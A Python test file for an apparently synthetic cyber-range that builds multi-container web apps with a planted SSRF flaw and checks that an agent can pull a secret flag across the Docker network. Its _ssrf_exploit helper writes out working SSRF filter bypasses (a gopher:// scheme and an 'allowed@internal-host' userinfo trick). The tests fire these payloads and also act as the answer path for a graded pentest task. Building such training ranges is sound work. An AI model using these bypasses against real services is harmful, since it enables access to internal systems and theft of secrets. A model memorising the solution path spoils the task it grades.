"""The networked multi-service backing: per-service realization, then (docker-gated)
the runtime that runs one container per service on a real network with real SSRF."""

from __future__ import annotations

import ast
import json
import shutil
import subprocess
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

import pytest
from cyber_webapp import (
    ContainerWebappRuntime,
    NetworkedContainerWebappRuntime,
    WebappPack,
)
from cyber_webapp.container import realize_services
from graphschema import WorldGraph
from openrange_pack_sdk import Backing, Snapshot

from openrange.core.admit import admit
from openrange.core.episode import EpisodeService

_SSRF_MANIFEST = {
    "pack": {"id": "webapp"},
    "runtime": {"tick": {"mode": "off"}},
    "npc": [],
    "seed": 3,
    "vuln_kinds": {"ssrf": 1},
}


def _admit_ssrf() -> Snapshot:
    snap = admit(WebappPack(), manifest=_SSRF_MANIFEST, max_repairs=3)
    assert isinstance(snap, Snapshot), snap
    return snap


def test_realize_services_splits_per_service_and_confines_the_flag() -> None:
    snap = _admit_ssrf()
    graph = snap.graph
    flag = str(graph.nodes["secret_flag"].attrs["value_ref"])
    images = realize_services(graph)

    assert len(images) == sum(1 for _ in graph.by_kind("service"))
    assert len(images) >= 2  # a networked world has multiple services
    owners = []
    for image in images:
        assert set(image.build_files) == {"Dockerfile", "app.py", "seed.json"}
        ast.parse(image.build_files["app.py"])  # each per-service app is valid Python
        if flag in image.build_files["seed.json"]:
            owners.append(image.name)
    assert len(owners) == 1  # the flag lives in exactly one service's image

    public = next(im for im in images if im.exposure == "public")
    internal = next(im for im in images if im.exposure == "internal")
    assert flag not in public.build_files["seed.json"]  # never in the public image
    # Per-service apps route on bare paths (their own container/port), not the
    # single-app `/svc/<name>` namespace.
    assert "/svc/" not in internal.build_files["app.py"]


def test_ssrf_world_is_networked_by_construction() -> None:
    # Generation re-homes the SSRF onto a PUBLIC service's endpoint — the pivot the
    # agent attacks — so it reaches the flag only across the network. That public-facing
    # shape is exactly what routes the world to the networked backing.
    graph = _admit_ssrf().graph
    ssrf = next(
        n for n in graph.by_kind("vulnerability") if n.attrs.get("kind") == "ssrf"
    )
    affected = {e.dst for e in graph.out_edges(ssrf.id, "affects")}
    public_eps = {
        e.dst
        for svc in graph.by_kind("service")
        if svc.attrs.get("exposure") == "public"
        for e in graph.out_edges(svc.id, "exposes")
    }
    assert affected & public_eps  # the SSRF sits on a public endpoint

    runtime = WebappPack().realize(graph, Backing.CONTAINER)
    assert isinstance(runtime, NetworkedContainerWebappRuntime)


def test_non_networked_world_stays_single_container() -> None:
    # A world whose vuln sits directly on the flag's own service (no public-service
    # pivot) isn't networked-shaped, so the CONTAINER backing runs it as one container.
    runtime = WebappPack().realize(_admit_cmdi().graph, Backing.CONTAINER)
    assert isinstance(runtime, ContainerWebappRuntime)
    assert not isinstance(runtime, NetworkedContainerWebappRuntime)


def _admit_cmdi() -> Snapshot:
    snap = admit(
        WebappPack(),
        manifest={
            "pack": {"id": "webapp"},
            "runtime": {"tick": {"mode": "off"}},
            "npc": [],
            "seed": 7,
            "loot_shapes": {"file": 1, "db": 0},
            "vuln_kinds": {"command_injection": 1},
        },
        max_repairs=3,
    )
    assert isinstance(snap, Snapshot), snap
    return snap


def _ssrf_exploit(graph: WorldGraph) -> tuple[str, str, str]:
    """The (public path, query param, payload URL) that pivots the SSRF to the
    internal metadata host — built from the sampled filter, as an agent would."""
    ssrf = next(
        n for n in graph.by_kind("vulnerability") if n.attrs.get("kind") == "ssrf"
    )
    params = dict(ssrf.attrs.get("params", {}))
    affected = {e.dst for e in graph.out_edges(ssrf.id, "affects")}
    public_eps = {
        e.dst
        for svc in graph.by_kind("service")
        if svc.attrs.get("exposure") == "public"
        for e in graph.out_edges(svc.id, "exposes")
    }
    ep_id = next(iter(affected & public_eps))
    path = str(graph.nodes[ep_id].attrs.get("path", "/"))
    param = str(params["target_param"])
    host = str(params["internal_host"])
    internal_path = str(params["internal_path"])
    ssrf_filter = params.get("ssrf_filter")
    if ssrf_filter == "scheme_block":
        payload = f"gopher://{host}{internal_path}"
    elif ssrf_filter == "host_allowlist":
        allowed = str(params.get("allowed_host", "ok"))
        payload = f"http://{allowed}@{host}{internal_path}"
    else:  # pragma: no cover - generation only emits the two service-name filters
        raise AssertionError(f"unexpected networked ssrf_filter: {ssrf_filter!r}")
    return path, param, payload


def _get(base_url: str, path: str, query: dict[str, str]) -> tuple[int, str]:
    url = f"{base_url}{path}?{urllib.parse.urlencode(query)}"
    try:
        with urllib.request.urlopen(url, timeout=15) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode()


def _docker_available() -> bool:
    if shutil.which("docker") is None:
        return False
    try:
        probe = subprocess.run(
            ["docker", "info"], capture_output=True, timeout=10, check=False
        )
    except Exception:  # noqa: BLE001 - any failure means "no"
        return False
    return probe.returncode == 0


@pytest.mark.skipif(not _docker_available(), reason="docker engine not reachable")
def test_networked_runtime_isolates_internal_services() -> None:
    # The public service is reachable from the host; an internal service is reachable
    # only from inside the network, by name — real network position. (Constructed
    # directly to isolate the runtime; an SSRF world also auto-routes here — see the
    # routing test above.)
    runtime = NetworkedContainerWebappRuntime(_admit_ssrf().graph, Backing.CONTAINER)
    try:
        runtime.reset()
        assert runtime.poll_events() == ()  # networked verdict comes from collect()
        base_url = str(runtime.surface()["base_url"])
        with urllib.request.urlopen(base_url + "/", timeout=10) as resp:
            assert resp.status == 200  # public service reachable from the host

        internal_name = runtime._internals[0].name
        probe = (
            "import urllib.request as u; "
            f"print(u.urlopen('http://{internal_name}:8000/', timeout=3).status)"
        )
        out = subprocess.run(
            ["docker", "exec", str(runtime._cname), "python", "-c", probe],
            capture_output=True,
            text=True,
            timeout=20,
        )
        # The public container reaches the internal service by name over the network.
        assert out.returncode == 0 and "200" in out.stdout, out.stderr

        # collect() aggregates every service's request log; a benign request leaks
        # nothing (the public service never holds the flag).
        final = runtime.collect()
        assert final["leaked_secret_ids"] == []
        assert "/" in final["requests_made"]
    finally:
        runtime.stop()


@pytest.mark.skipif(not _docker_available(), reason="docker engine not reachable")
def test_networked_ssrf_recovers_the_flag_across_containers() -> None:
    # The whole point: the flag lives in an internal container the host can't address.
    # The agent recovers it ONLY by making the public service's SSRF fetch the internal
    # metadata host over the docker network — a real cross-container exploit.
    snap = _admit_ssrf()
    graph = snap.graph
    flag = str(graph.nodes["secret_flag"].attrs["value_ref"])
    ssrf = next(
        n for n in graph.by_kind("vulnerability") if n.attrs.get("kind") == "ssrf"
    )
    internal_path = str(ssrf.attrs["params"]["internal_path"])
    path, param, payload = _ssrf_exploit(graph)

    runtime = WebappPack().realize(graph, Backing.CONTAINER)
    assert isinstance(runtime, NetworkedContainerWebappRuntime)
    try:
        runtime.reset()
        base_url = str(runtime.surface()["base_url"])

        # The internal metadata path is NOT reachable on the public service directly —
        # the flag can only come through the pivot, not a path lookup on one host.
        _, direct_body = _get(base_url, internal_path, {})
        assert flag not in direct_body

        # A benign fetch that doesn't resolve to the internal host leaks nothing.
        _, benign_body = _get(base_url, path, {param: "gopher://example.com/"})
        assert flag not in benign_body

        # The real exploit: the SSRF pivots to the internal host and returns its secret.
        status, body = _get(base_url, path, {param: payload})
        assert status == 200, body
        assert flag in body  # recovered across the container boundary

        # The verdict sees the leak in the aggregated logs.
        final = runtime.collect()
        assert "secret_flag" in final["leaked_secret_ids"]
    finally:
        runtime.stop()


@pytest.mark.skipif(not _docker_available(), reason="docker engine not reachable")
def test_ssrf_parity_across_backings(tmp_path: Path) -> None:
    # The same SSRF world is solvable on both backings — PROCESS reads the shared
    # secret in place, CONTAINER fetches it for real across the network. Same exploit,
    # same flag: the sim-to-real gap is the runtime, not the task.
    snap = _admit_ssrf()
    graph = snap.graph
    flag = str(graph.nodes["secret_flag"].attrs["value_ref"])
    path, param, payload = _ssrf_exploit(graph)
    query = {param: payload}

    # PROCESS, through the real episode harness.
    pentest = next(t for t in snap.tasks if t.meta.get("family") == "webapp.pentest")
    svc = EpisodeService(WebappPack(), tmp_path)
    try:
        handle = svc.start_episode(snap, pentest.id)
        base = str(svc.surface(handle)["base_url"])
        _, process_body = _get(base, path, query)
    finally:
        svc.close()
    assert flag in process_body

    # CONTAINER, through the networked runtime (a real cross-container fetch).
    runtime = WebappPack().realize(graph, Backing.CONTAINER)
    try:
        runtime.reset()
        base = str(runtime.surface()["base_url"])
        _, container_body = _get(base, path, query)
    finally:
        runtime.stop()
    assert flag in container_body


@pytest.mark.skipif(not _docker_available(), reason="docker engine not reachable")
def test_networked_ssrf_grades_through_the_container_harness(tmp_path: Path) -> None:
    # The full grade path the trainer / run_episode use: start the episode on the
    # CONTAINER backing, recover the flag across the network, submit it, and let the
    # pack's check_success grade it. Proves the networked world is a gradable episode
    # end to end — not just an HTTP body that happens to carry the flag.
    snap = _admit_ssrf()
    graph = snap.graph
    flag = str(graph.nodes["secret_flag"].attrs["value_ref"])
    path, param, payload = _ssrf_exploit(graph)
    pentest = next(t for t in snap.tasks if t.meta.get("family") == "webapp.pentest")

    svc = EpisodeService(WebappPack(), tmp_path, backing=Backing.CONTAINER)
    try:
        handle = svc.start_episode(snap, pentest.id)
        base = str(svc.surface(handle)["base_url"])
        _, body = _get(base, path, {param: payload})
        assert flag in body  # recovered across the container boundary
        # Submit the recovered flag the way the harness grades it.
        (Path(svc.solver_root(handle)) / "result.json").write_text(
            json.dumps({"flag": flag})
        )
        report = svc.stop_episode(handle)
    finally:
        svc.close()
    assert report.passed
    assert report.episode_result.success
    assert report.episode_result.subgoals["matched_flag"]
